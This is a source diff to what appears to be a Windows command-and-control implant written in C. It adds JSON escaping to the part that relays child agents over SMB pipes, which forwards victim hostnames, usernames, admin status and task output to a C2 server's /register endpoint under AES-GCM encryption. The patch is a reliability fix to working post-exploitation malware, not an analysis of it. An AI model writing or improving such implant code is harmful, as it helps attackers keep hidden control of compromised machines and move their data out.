@@ -69,6 +69,54 @@ static int js_bool(const char *json, const char *key) {
     return strncmp(p, "true", 4) == 0;
 }
 
+/* Escape a string before embedding it in a JSON string value.  The child
+ * transport sends usernames such as HOST\\localuser; agent_json_str() decodes
+ * that to a single backslash, so forwarding the decoded value verbatim would
+ * produce invalid JSON (\\l is not a JSON escape). */
+static char* json_escape(const char *s) {
+    if (!s) return _strdup("");
+
+    size_t need = 1;
+    for (const unsigned char *p = (const unsigned char*)s; *p; p++) {
+        switch (*p) {
+        case '"': case '\\': case '\n': case '\r': case '\t':
+        case '\b': case '\f':
+            need += 2;
+            break;
+        default:
+            need += (*p < 0x20) ? 6 : 1; /* \\u00XX for other controls */
+            break;
+        }
+    }
+
+    char *out = (char*)malloc(need);
+    if (!out) return NULL;
+    size_t n = 0;
+    for (const unsigned char *p = (const unsigned char*)s; *p; p++) {
+        switch (*p) {
+        case '"':  out[n++] = '\\'; out[n++] = '"';  break;
+        case '\\': out[n++] = '\\'; out[n++] = '\\'; break;
+        case '\n': out[n++] = '\\'; out[n++] = 'n';  break;
+        case '\r': out[n++] = '\\'; out[n++] = 'r';  break;
+        case '\t': out[n++] = '\\'; out[n++] = 't';  break;
+        case '\b': out[n++] = '\\'; out[n++] = 'b';  break;
+        case '\f': out[n++] = '\\'; out[n++] = 'f';  break;
+        default:
+            if (*p < 0x20) {
+                static const char hex[] = "0123456789abcdef";
+                out[n++] = '\\'; out[n++] = 'u';
+                out[n++] = '0'; out[n++] = '0';
+                out[n++] = hex[*p >> 4]; out[n++] = hex[*p & 0x0f];
+            } else {
+                out[n++] = (char)*p;
+            }
+            break;
+        }
+    }
+    out[n] = '\0';
+    return out;
+}
+
 /* ── per-connection state (heap-allocated, freed by conn_thread) ────────────── */
 
 typedef struct {
@@ -150,18 +198,26 @@ static void relay_result(const char *msg, ConnState *cs, HANDLE pipe) {
     char *err_str = agent_json_str_alloc(msg, "error");
     int   is_admin = js_bool(msg, "is_admin");
 
-    size_t body_sz = (output ? strlen(output) : 0) +
-                     (err_str ? strlen(err_str) : 0) + 256;
+    char *output_j = json_escape(output ? output : "");
+    char *err_j    = json_escape(err_str ? err_str : "");
+    if (!output_j || !err_j) {
+        free(output); free(err_str); free(output_j); free(err_j);
+        goto ack;
+    }
+
+    size_t body_sz = strlen(output_j) + strlen(err_j) + 256;
     char *body = (char*)malloc(body_sz);
-    if (!body) { free(output); free(err_str); goto ack; }
+    if (!body) {
+        free(output); free(err_str); free(output_j); free(err_j);
+        goto ack;
+    }
 
     snprintf(body, body_sz,
         "{\"task_id\":%lld,\"output\":\"%s\",\"error\":\"%s\",\"is_admin\":%s}",
         task_id,
-        output  ? output  : "",
-        err_str ? err_str : "",
+        output_j, err_j,
         is_admin ? "true" : "false");
-    free(output); free(err_str);
+    free(output); free(err_str); free(output_j); free(err_j);
 
     size_t enc_len = 0;
     uint8_t *enc = aes_gcm_seal(cs->aes_key, 32,
@@ -211,15 +267,25 @@ static DWORD WINAPI conn_thread(LPVOID arg) {
     entered = 1;
 
     /* forward registration to C2 */
-    char reg[1024];
+    char *hostname_j = json_escape(hostname);
+    char *username_j = json_escape(username);
+    char *os_j       = json_escape(os_str);
+    char *language_j  = json_escape(language[0] ? language : "c");
+    if (!hostname_j || !username_j || !os_j || !language_j) {
+        free(hostname_j); free(username_j); free(os_j); free(language_j);
+        goto done;
+    }
+
+    char reg[2048];
     snprintf(reg, sizeof(reg),
         "{\"hostname\":\"%s\",\"username\":\"%s\",\"os\":\"%s\","
         "\"pid\":%lld,\"transport\":\"smb\",\"is_admin\":%s,\"language\":\"%s\","
         "\"parent_id\":\"%s\"}",
-        hostname, username, os_str, pid,
+        hostname_j, username_j, os_j, pid,
         is_admin ? "true" : "false",
-        language[0] ? language : "c",
+        language_j,
         g_agent.agent_id);
+    free(hostname_j); free(username_j); free(os_j); free(language_j);
 
     uint8_t *resp = NULL; size_t resp_len = 0; int status = 0;
     agent_http_do("POST", "/register",
